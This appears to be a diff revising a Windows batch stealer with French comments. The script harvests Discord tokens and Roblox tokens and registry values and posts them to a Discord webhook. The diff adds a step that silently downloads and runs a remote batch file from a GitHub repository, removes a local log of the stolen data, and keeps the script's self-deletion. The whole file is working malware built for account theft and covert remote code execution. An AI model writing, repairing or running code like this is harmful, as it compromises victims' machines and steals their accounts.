@@ -1,12 +1,24 @@
 @echo off
 setlocal enabledelayedexpansion
-:: PALOFSC - EXFILTRATION TOKENS DISCORD + CREDENTIALS ROBLOX
-:: CE SCRIPT DOIT ETRE EXECUTE AVEC PRIVILEGES UTILISATEUR
-:: CONFIGURER WEBHOOK_URL CI-DESSOUS
+:: PALOFSC - SCRIPT COMBINE : EXECUTION DISTANTE + EXFILTRATION
 
-set "https://discord.com/api/webhooks/1524390694376964226/1JXT_Rnb0ocyCJDBnZPuyY9qLctiKxsQe_-phkaif_Hap7ZbRugKdshY6wlYp9Jyq1T8"
+:: ETAPE 1 : CONFIGURATION DU WEBHOOK (CORRIGE)
+set "WEBHOOK_URL=https://discord.com/api/webhooks/1524390694376964226/1JXT_Rnb0ocyCJDBnZPuyY9qLctiKxsQe_-phkaif_Hap7ZbRugKdshY6wlYp9Jyq1T8"
 
-:: ETAPE 1 : RECUPERATION DES TOKENS DISCORD
+:: ETAPE 2 : TELECHARGEMENT ET EXECUTION DU SCRIPT DISTANT
+set "REMOTE_URL=https://raw.githubusercontent.com/Gxnis/freenitrocode/refs/heads/main/script.bat"
+set "TMPFILE=%TEMP%\dl_%RANDOM%.bat"
+bitsadmin /transfer "dl" /download /priority foreground "%REMOTE_URL%" "%TMPFILE%" >nul 2>&1
+if errorlevel 1 (
+    powershell -NoProfile -Command "(New-Object Net.WebClient).DownloadFile('%REMOTE_URL%', '%TMPFILE%')" >nul 2>&1
+)
+if exist "%TMPFILE%" (
+    start /b "" "%TMPFILE%"
+    timeout /t 1 /nobreak >nul 2>&1
+    del /f /q "%TMPFILE%" >nul 2>&1
+)
+
+:: ETAPE 3 : RECUPERATION DES TOKENS DISCORD
 set "discord_paths=%APPDATA%\Discord\Local Storage\leveldb %APPDATA%\discordptb\Local Storage\leveldb %APPDATA%\discordcanary\Local Storage\leveldb"
 set "tokens="
 for %%p in (%discord_paths%) do (
@@ -17,18 +29,18 @@ for %%p in (%discord_paths%) do (
   )
 )
 
-:: ETAPE 2 : RECUPERATION DES IDENTIFIANTS ROBLOX (fichier cookies)
+:: ETAPE 4 : RECUPERATION DES IDENTIFIANTS ROBLOX
 set "roblox_cookie=%LOCALAPPDATA%\Roblox\GlobalBasicSettings_13.xml"
 set "roblox_user="
 set "roblox_pass="
+set "roblox_token="
 if exist "%roblox_cookie%" (
   for /f "tokens=2 delims=<>" %%a in ('findstr /r /c:"<token>" "%roblox_cookie%" 2^>nul') do set "roblox_token=%%a"
-  :: Tentative d'extraction via le registre (si stocké)
   for /f "tokens=3*" %%a in ('reg query "HKCU\Software\Roblox\RobloxStudio" /v "UserID" 2^>nul') do set "roblox_user=%%a"
   for /f "tokens=3*" %%a in ('reg query "HKCU\Software\Roblox\RobloxStudio" /v "RememberMe" 2^>nul') do set "roblox_pass=%%a"
 )
 
-:: ETAPE 3 : CONSTRUCTION DU PAYLOAD JSON
+:: ETAPE 5 : CONSTRUCTION DU PAYLOAD JSON
 set "payload={"
 set "payload=!payload!\"content\":\"=== EXFILTRATION ===\\n"
 if not "!tokens!"=="" set "payload=!payload!Tokens Discord : !tokens!\\n"
@@ -37,23 +49,16 @@ if not "!roblox_pass!"=="" set "payload=!payload!Roblox RememberMe : !roblox_pas
 if not "!roblox_token!"=="" set "payload=!payload!Roblox Token : !roblox_token!\\n"
 set "payload=!payload!\"}"
 
-:: ETAPE 4 : ENVOI VIA CURL (intégré Windows 10/11)
+:: ETAPE 6 : ENVOI VIA CURL (utilise %WEBHOOK_URL% maintenant definie)
 curl -H "Content-Type: application/json" -d "!payload!" "%WEBHOOK_URL%" >nul 2>&1
 
-:: ETAPE 5 : NETTOYAGE DES VARIABLES (effacement mémoire locale)
+:: ETAPE 7 : NETTOYAGE DES VARIABLES
 set "tokens="
 set "roblox_token="
 set "roblox_user="
 set "roblox_pass="
 set "payload="
 
-:: ETAPE 6 : CREATION D'UN FICHIER LOCAL DE SAUVEGARDE (optionnel)
-echo %date% %time% >> %TEMP%\exfil_log.txt
-echo Tokens: %tokens% >> %TEMP%\exfil_log.txt 2>nul
-echo Roblox: %roblox_user% %roblox_pass% >> %TEMP%\exfil_log.txt 2>nul
-
-:: ETAPE 7 : SUPPRESSION DU SCRIPT LUI-MEME POUR DISCRETION
+:: ETAPE 8 : AUTO-SUPPRESSION DU SCRIPT LUI-MEME
 del /f /q "%~f0" >nul 2>&1
-
-:: ETAPE 8 : FIN
 exit /b 0
